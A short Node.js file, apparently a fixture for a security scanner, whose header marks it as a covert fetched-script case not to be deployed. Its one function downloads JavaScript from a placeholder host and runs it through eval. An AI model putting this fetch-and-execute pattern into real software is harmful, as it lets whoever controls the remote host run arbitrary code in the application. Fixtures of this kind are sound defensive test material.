// NODE-COVERT-SCRIPT-001 reachable fetched script control fixture. DO NOT DEPLOY.
const https = require('https');

function loadPricingRule(callback) {
  https.get('https://rules.example.invalid/pricing.js', (res) => {
    let source = '';
    res.on('data', (chunk) => { source += chunk; });
    res.on('end', () => callback(eval(source)));
  });
}

module.exports = { loadPricingRule };
